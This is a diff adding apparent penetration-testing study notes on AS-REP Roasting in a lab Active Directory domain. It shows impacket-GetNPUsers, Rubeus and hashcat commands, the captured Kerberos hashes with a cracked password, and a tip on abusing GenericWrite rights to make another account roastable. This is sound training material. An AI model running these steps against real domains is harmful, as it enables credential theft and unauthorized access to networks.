@@ -241,3 +241,56 @@ Note: If you receive a network error, make sure that the encoding of usernames.t
 
 ### AS-REP Roasting
 
+If the AS-REQ auth was successful, the DC replies with an AS-REP containing the session key and TGT. This is called Kerberos preauthentication, and it prevents offline password cracking.
+
+The AD user account option "Do not require Kerberos preauthentication" is disabled by default. However, it is possible to enable this manually. 
+
+Let's try the attack from Kali first.
+
+```console
+kali$ impacket-GetNPUsers -dc-ip 192.168.249.70  -request -outputfile hashes.asreproast corp.com/pete
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Password: // use pete's password we already found
+Name  MemberOf                                  PasswordLastSet             LastLogon                   UAC      
+----  ----------------------------------------  --------------------------  --------------------------  --------
+dave  CN=Development Department,DC=corp,DC=com  2022-09-07 12:54:57.521205  2024-04-16 17:35:28.945619  0x410200
+
+// dave has the user account option Do not require Kerberos preauthentication enabled, meaning it's vulnerable to AS-REP Roasting
+
+kali$ hashcat --help | grep -i "Kerberos"
+  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
+
+kali$ sudo hashcat -m 18200 hashes.asreproast /home/kali/Desktop/oscp/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+$krb5asrep$23$dave@CORP.COM:5994867aa29e677533115b81be00b677$54d233b58433e0dfc213bffe51033bcd47b6b2628a80dbb06c043075d69f3a19fa3309facd9970813e478568cf99247331f89ed11596f096afc9210ffb5479c0f71be3783ad600cbc39d6e57e9d6a58a5085ebdfb58e903e909e7d268eb1da722d8934a72feaa1228a1364e6edd9e094d86a06cbb2779c1c115c81f59c15daf104e71241abe86f40add72c02a2e589300701fdeac37b462a078d8c60ebf025224b6c01484eea6c46e2df69ecde4717625362e6b9843db9fd517f71396ee26abc7b2aef6e84f6598ae790b45882d672715eca2b5729c8c5e94c910ab1a7fdea2d3b839ee3:Flowers1
+```
+
+Let's try AS-REP Roasting in Windows now using Rubeus.
+
+```console
+PS> cd C:\Tools
+
+PS> .\Rubeus.exe asreproast /nowrap
+[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
+[*] SamAccountName         : dave
+[*] DistinguishedName      : CN=dave,CN=Users,DC=corp,DC=com
+[*] Using domain controller: DC1.corp.com (192.168.249.70)
+[*] Building AS-REQ (w/o preauth) for: 'corp.com\dave'
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+
+// since we're performing this attack as a pre-authenticated domain user, we don't have to provide any other options
+// Rubeus will automatically identify vulnerable user accounts
+// Rubeus found that dave is vulnerable
+// copy the hash and transfer it to kali
+
+kali$ sudo hashcat -m 18200 hashes.asreproast2 /home/kali/Desktop/oscp/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+$krb5asrep$dave@corp.com:b1beefafd55aa9328fa16480397f7e0b$d1d0984009e012e3a40511e07a600b7480e9f6bd0f1d39eda5a0bd1ef42069f7f9c325136b51b6d91ed798a49e681fd19e571dfba6817a52bda76195f9f5c97c1397188288b60c63c1a6143e9fdb292db03bd92ae4c955eed03af20f7ebbd7417df63f7d7a89b20d924c4cf41da3eb25eff202b726a9153f70cd5f7ab706b76ffa9b1da6ec4c14dd861694ff74f81caa16213ab91975604868ed0f05b349403747b53d4fe4614aa943d10ae0848f1a4c630e1ae30046826118a6c85cb6ac85771da3b658a4e9c6d0435c3d9ffc4056d468d000fd2ba6fec22f6ac2f89938d91df94a63c6:Flowers1
+```
+
+To identify users with the enabled AD user account option Do not require Kerberos preauthentication, we can use PowerView's Get-DomainUser function with the option -PreauthNotRequired on Windows. On Kali, we can use impacket-GetNPUsers as shown in (impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete)  without the -request and -outputfile options.
+
+If you happen to have GenericWrite or GenericAll on another AD user account, instead of changing their password, you can change the User Account Control value of the user to not require Kerberos preauthentication.
+
+### Kerberoasting
+
